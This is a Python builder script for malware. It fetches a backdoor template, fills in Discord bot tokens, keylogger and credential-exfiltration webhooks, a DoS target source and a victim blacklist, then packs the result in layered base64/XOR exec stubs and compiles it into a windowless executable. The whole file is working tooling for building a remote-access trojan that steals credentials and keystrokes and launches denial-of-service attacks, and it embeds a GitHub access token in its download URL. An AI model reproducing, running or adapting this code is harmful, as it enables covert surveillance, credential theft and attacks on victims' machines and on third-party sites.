import os,random,base64,subprocess,shutil,getpass,requests
__root__ = os.environ["SystemDrive"]
__app_storage__ = os.path.join(os.getenv('APPDATA'),"Builder")
if not os.path.exists(__app_storage__):
    os.makedirs(__app_storage__)
os.chdir(__app_storage__)
def clear():
    os.system("cls" if os.name == "nt" else "clear") 
def layer1(file):
    with open(file,'rb') as f:
        code = f.read()
        base64code = base64.b64encode(code)
    with open(file,'w',encoding="utf-8") as f:
        f.write(f'''import base64;exec(base64.b64decode({base64code}))''')
def layer2(file):
    with open(file, 'r',encoding="utf-8") as f:
        code = f.read()
    crypted = base64.b64encode(bytes(c ^ 42 for c in code.encode('utf-8'))).decode()
    stub = f"""import base64;exec(bytes(b ^ 42 for b in base64.b64decode({crypted!r})).decode())"""
    with open(file, 'w',encoding="utf-8") as f:
        f.write(stub)
def run(command):
    subprocess.run(
    command,
    shell=True,
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
    creationflags=subprocess.CREATE_NO_WINDOW
)

def ask(question=str) -> str:
    while True:
        response = input(question)
        if not "n" in input("is this value good ?").lower():
            return response

ascii = [r"""
 888888ba           oo dP       dP                   
 88    `8b             88       88                   
a88aaaa8P' dP    dP dP 88 .d888b88 .d8888b. 88d888b. 
 88   `8b. 88    88 88 88 88'  `88 88ooood8 88'  `88 
 88    .88 88.  .88 88 88 88.  .88 88.  ... 88       
 88888888P `88888P' dP dP `88888P8 `88888P' dP       
ooooooooooooooooooooooooooooooooooooooooooooooooooooo""",
r'''
M#"""""""'M           oo dP       dP                   
##  mmmm. `M             88       88                   
#'        .M dP    dP dP 88 .d888b88 .d8888b. 88d888b. 
M#  MMMb.'YM 88    88 88 88 88'  `88 88ooood8 88'  `88 
M#  MMMM'  M 88.  .88 88 88 88.  .88 88.  ... 88       
M#       .;M `88888P' dP dP `88888P8 `88888P' dP       
M#########M                                            ''']
ascii=random.choice(ascii)
clear()
if os.path.exists(f'{__app_storage__}/Build'):
    shutil.rmtree(f'{__app_storage__}/Build')
os.makedirs(f'{__app_storage__}/Build')
if os.path.exists(f'{__app_storage__}/dist'):
    shutil.rmtree(f'{__app_storage__}/dist')
print(ascii)
print(f"""
            [+] Created by NOTRUNIT\n\n""")
if not os.path.exists("chouquette_template.py"):
    print('> template file doesn\'t exist ')

    url = "https://raw.githubusercontent.com/nottwice/storage/refs/heads/main/chouquette_template.py?token=GHSAT0AAAAAADGRY3JWDBROG3WOMHZPXAWA2DMEK4A"


    response = requests.get(url)

    if response.status_code == 200:
        with open(f"{__app_storage__}/chouquette_template.py", "wb") as f:
            f.write(response.content)
        print("> template téléchargé.")
    else:
        print(f"Erreur : {response.status_code}")
if os.path.exists(f'{__app_storage__}/build_settings.txt'):
    previous = input('import previous settings ? ')
    if not "n" in previous.lower():
        with open(f'{__app_storage__}/build_settings.txt','r') as f:
            settings = f.readlines()
            NAME = settings[0].strip()
            COMPILE = settings[1].strip()
            ICON= settings[2].strip()
            CONNECTION_WEBHOOK = settings[3].strip()
            BOT_TOKEN = settings[4].strip()
            USER_ID = settings[5].strip()
            GUILD_ID = settings[6].strip() 
            KEYLOGGER_WEBHOOK = settings[7].strip() 
            DOS_CONTENT = settings[8].strip()
            DOS_START_WEBHOOK = settings[9].strip() 
            CREDS_WEBHOOK = settings[10].strip() 
            BLACKLIST_URL = settings[11].strip() 
    else:
        NAME = ask('enter the name of the backdoor > ')
        COMPILE = ask('the backdoor should be compiled ? ')
        if not 'n' in COMPILE.lower(): ICON=ask('enter icon path (empty for no icon) > ')
        else: ICON=""
        CONNECTION_WEBHOOK = ask("enter the url for notification at connection > ")
        BOT_TOKEN = ask("enter the bot token > ")
        USER_ID = ask("enter the user id > ")
        GUILD_ID = ask("enter the guild id > ")
        KEYLOGGER_WEBHOOK = ask("enter the keylogger webhook > ")
        DOS_CONTENT = ask("enter the raw github file or other url where is the url of site to attack > ")
        DOS_START_WEBHOOK = ask("enter the url for notification at dos start > ")
        CREDS_WEBHOOK = ask("enter the url for credentails > ")
        BLACKLIST_URL = ask("enter the raw github file or other url where is the black list of users/computer name/public IP > ")
        settings = [NAME,COMPILE,ICON,CONNECTION_WEBHOOK,BOT_TOKEN,USER_ID,GUILD_ID,KEYLOGGER_WEBHOOK,DOS_CONTENT,DOS_START_WEBHOOK,CREDS_WEBHOOK,BLACKLIST_URL]
        with open(f'{__app_storage__}/build_settings.txt','w') as f:
            for setting in settings:
                f.write(setting + '\n')
else:
    
    NAME = ask('enter the name of the backdoor > ')
    COMPILE = ask('the backdoor should be compiled ? ')
    if not 'n' in COMPILE.lower(): ICON=ask('enter icon path (empty for no icon) > ')
    else: ICON=""
    CONNECTION_WEBHOOK = ask("enter the url for notification at connection > ")
    BOT_TOKEN = ask("enter the bot token > ")
    USER_ID = ask("enter the user id > ")
    GUILD_ID = ask("enter the guild id > ")
    KEYLOGGER_WEBHOOK = ask("enter the keylogger webhook > ")
    DOS_CONTENT = ask("enter the raw github file or other url where is the url of site to attack > ")
    DOS_START_WEBHOOK = ask("enter the url for notification at dos start > ")
    CREDS_WEBHOOK = ask("enter the url for credentails > ")
    BLACKLIST_URL = ask("enter the raw github file or other url where is the black list of users/computer name/public IP > ")
    settings = [NAME,COMPILE,ICON,CONNECTION_WEBHOOK,BOT_TOKEN,USER_ID,GUILD_ID,KEYLOGGER_WEBHOOK,DOS_CONTENT,DOS_START_WEBHOOK,CREDS_WEBHOOK,BLACKLIST_URL]
    with open('build_settings.txt','w') as f:
        for setting in settings:
            f.write(setting + '\n')
###CONNECTION_WEBHOOK###    url for notification at connection 
###BOT_TOKEN###             discord bot token
###USER_ID###               discord user id of the guy that control the backdoor
###GUILD_iD###              discord server id 
###KEYLOGGER_WEBHOOK###     discord keylogger webhook
###DOS_CONTENT###           raw github file or other url wich content the url of the dos attack
###DOS_START_WEBHOOK###     DOS start webhook
###CREDS_WEHBOOK###         discord webhook where creditentials are received
###BLACKLIST_URL###         raw github file or other url where is the black list of users/computer name/IP 






template = open(f"{__app_storage__}/chouquette_template.py",'r',encoding="utf-8").read()
template = template.replace("###CONNECTION_WEBHOOK###",CONNECTION_WEBHOOK)
print('> connection webhook set ')
template = template.replace("###BOT_TOKEN###",BOT_TOKEN)
print('> Bot Token set')
template = template.replace("###USER_ID###",USER_ID)
print('> User ID set')
template = template.replace("###GUILD_ID###",GUILD_ID)
print('> Guild ID set')
template = template.replace("###KEYLOGGER_WEBHOOK###",KEYLOGGER_WEBHOOK)
print('> Keylogger WebHook set')
template = template.replace("###DOS_CONTENT###",DOS_CONTENT)
print('> DOS URL set')
template = template.replace("###DOS_START_WEBHOOK###",DOS_START_WEBHOOK)
print('> DOS start webhook set ')
template = template.replace("###CREDS_WEBHOOK###",CREDS_WEBHOOK)
print('> Credidentials WebHook set ')
template = template.replace("###BLACKLIST_URL###",BLACKLIST_URL)
print('> Blacklist Url set')

with open(f'{__app_storage__}/Build/{NAME}.py','w',encoding="utf-8") as f:
    f.write(template)
    f.close()
print(f'> File {NAME}.py created in Build folder')
if not "n" in COMPILE.lower():
    print(f'> Crypting {NAME}.py')
    fonctions = [
    (layer1, f'{__app_storage__}/Build/{NAME}.py'),
    (layer2, f'{__app_storage__}/Build/{NAME}.py'),
]

    nb = random.randint(1, 5)

    for _ in range(nb):
        fct, arg = random.choice(fonctions)
        fct(arg)
    print('> Crypting done')
    print('> start compiling ')
    if not ICON =="":
        command = rf'pyinstaller --noconfirm --onefile --windowed --icon "{ICON}" --name "{NAME}" --hidden-import "discord" --hidden-import "subprocess" --hidden-import "asyncio" --hidden-import "os" --hidden-import "getpass" --hidden-import "requests" --hidden-import "wmi" --hidden-import "socket" --hidden-import "Crypto.Cipher" --hidden-import "Crypto.Cipher.AES" --hidden-import "sqlite3" --hidden-import "discord.ui" --hidden-import "urllib.request" --hidden-import "re" --hidden-import "zipfile" --hidden-import "base64" --hidden-import "win32crypt" --hidden-import "random" --hidden-import "numpy" --hidden-import "tkinter.scrolledtext" --hidden-import "winreg" --hidden-import "httpx" --hidden-import "shutil" --hidden-import "win32security" --hidden-import "cv2" --hidden-import "directory_tree.DisplayTree" --hidden-import "threading" --hidden-import "tkinter" --hidden-import "tkinter.messagebox" --hidden-import "uuid" --hidden-import "datetime" --hidden-import "time" --hidden-import "ntsecuritycon" --hidden-import "json" --hidden-import "sys" --hidden-import "simplejson" --hidden-import "psutil" --hidden-import "ctypes" --hidden-import "directory_tree" --hidden-import "keyboard" --hidden-import "aiohttp" --hidden-import "PIL.ImageGrab" "{__app_storage__}/Build/{NAME}.py"'
        run(command)
    else:
        command = rf'pyinstaller --noconfirm --onefile --windowed --name "{NAME}" --hidden-import "discord" --hidden-import "subprocess" --hidden-import "asyncio" --hidden-import "os" --hidden-import "getpass" --hidden-import "requests" --hidden-import "wmi" --hidden-import "socket" --hidden-import "Crypto.Cipher" --hidden-import "Crypto.Cipher.AES" --hidden-import "sqlite3" --hidden-import "discord.ui" --hidden-import "urllib.request" --hidden-import "re" --hidden-import "zipfile" --hidden-import "base64" --hidden-import "win32crypt" --hidden-import "random" --hidden-import "numpy" --hidden-import "tkinter.scrolledtext" --hidden-import "winreg" --hidden-import "httpx" --hidden-import "shutil" --hidden-import "win32security" --hidden-import "cv2" --hidden-import "directory_tree.DisplayTree" --hidden-import "threading" --hidden-import "tkinter" --hidden-import "tkinter.messagebox" --hidden-import "uuid" --hidden-import "datetime" --hidden-import "time" --hidden-import "ntsecuritycon" --hidden-import "json" --hidden-import "sys" --hidden-import "simplejson" --hidden-import "psutil" --hidden-import "ctypes" --hidden-import "keyboard" --hidden-import "directory_tree" --hidden-import "aiohttp" --hidden-import "PIL.ImageGrab" "{__app_storage__}/Build/{NAME}.py"'
        run(command)
    if os.path.exists(f"dist/{NAME}.exe"):
        print(f"> {NAME}.py was succesfully compiled ")
        shutil.move(f"dist/{NAME}.exe", fr"{__root__}\Users\{getpass.getuser()}\Desktop\{NAME}.exe")
        print(f"> {NAME}.exe was moved to your desktop ")
    else:
        print(f"> compiling failed ")
else:
    shutil.move(f"dist/{NAME}.py",f"{os.path.join(__root__,"Users",getpass.getuser(),"Desktop",f"{NAME}.py")}")
    print(f"> {NAME}.py was moved to your desktop ")